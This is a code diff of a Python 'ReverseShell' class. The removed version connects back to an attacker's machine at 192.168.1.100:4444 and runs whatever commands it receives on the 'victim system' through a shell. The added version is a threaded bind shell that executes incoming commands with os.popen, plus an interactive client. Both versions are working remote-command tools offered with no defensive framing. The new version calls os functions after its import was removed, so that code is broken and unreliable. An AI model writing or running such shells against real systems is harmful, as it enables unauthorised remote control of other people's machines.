@@ -1,60 +1,62 @@
 import socket
-import subprocess
-import os
-import sys
+import threading
 
 class ReverseShell:
-    def __init__(self, attack_ip, attack_port):
-        self.attack_ip = attack_ip  # IP address of the attacker's machine
-        self.attack_port = attack_port  # Port on which the attacker is listening
-        self.client_socket = None
+    def __init__(self, listen_ip, listen_port, target_ip, target_port):
+        self.listen_ip = listen_ip
+        self.listen_port = listen_port
+        self.target_ip = target_ip
+        self.target_port = target_port
 
-    def create_reverse_shell(self):
-        """
-        Create a reverse shell that connects back to the attacker's machine.
-        """
-        try:
-            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.client_socket.connect((self.attack_ip, self.attack_port))
-            print(f"Connected back to attacker at {self.attack_ip}:{self.attack_port}")
-            
-            # Execute commands from the attacker's side and send output back
-            while True:
-                # Receive command from the attacker
-                command = self.client_socket.recv(1024).decode('utf-8')
+    def handle_client(self, client_socket):
+        while True:
+            try:
+                command = client_socket.recv(1024).decode('utf-8')
                 if command.lower() == 'exit':
-                    print("Exiting reverse shell.")
                     break
-                elif command.lower().startswith("cd "):
-                    # Change directory on the victim system
+                elif command.lower().startswith('cd'):
                     try:
-                        os.chdir(command[3:])
-                        self.client_socket.send(b"Changed directory")
-                    except FileNotFoundError as e:
-                        self.client_socket.send(f"Error: {e}".encode())
+                        path = command.split(' ', 1)[1]
+                        os.chdir(path)
+                        client_socket.send(f"Changed directory to {path}".encode('utf-8'))
+                    except Exception as e:
+                        client_socket.send(f"Error changing directory: {e}".encode('utf-8'))
                 else:
-                    # Execute other system commands
-                    output = self.execute_command(command)
-                    self.client_socket.send(output.encode())
-            self.client_socket.close()
-        except Exception as e:
-            print(f"Error while creating reverse shell: {e}")
-            if self.client_socket:
-                self.client_socket.close()
+                    output = os.popen(command).read()
+                    client_socket.send(output.encode('utf-8'))
+            except Exception as e:
+                client_socket.send(f"Error: {e}".encode('utf-8'))
+        client_socket.close()
 
-    def execute_command(self, command):
-        """
-        Execute a system command on the victim machine and return the result.
-        """
+    def start_reverse_shell(self):
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind((self.listen_ip, self.listen_port))
+        server_socket.listen(5)
+        print(f"Listening on {self.listen_ip}:{self.listen_port}...")
+
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f"Connection received from {addr}")
+            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
+            client_handler.start()
+
+    def connect_back(self):
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-            return output.decode('utf-8')
-        except subprocess.CalledProcessError as e:
-            return f"Command failed: {e.output.decode('utf-8')}"
+            client_socket.connect((self.target_ip, self.target_port))
+            print(f"Connected to {self.target_ip}:{self.target_port}")
+            while True:
+                command = input(f"Shell> ")
+                if command.lower() == "exit":
+                    break
+                client_socket.send(command.encode('utf-8'))
+                response = client_socket.recv(4096).decode('utf-8')
+                print(response)
+        except Exception as e:
+            print(f"Connection failed: {e}")
+        finally:
+            client_socket.close()
 
-# Example usage
 if __name__ == "__main__":
-    attacker_ip = "192.168.1.100"  # Change to your attacker's IP address
-    attacker_port = 4444  # Port to listen on
-    shell = ReverseShell(attacker_ip, attacker_port)
-    shell.create_reverse_shell()
+    reverse_shell = ReverseShell('0.0.0.0', 9999, '192.168.1.100', 8888)
+    reverse_shell.start_reverse_shell()
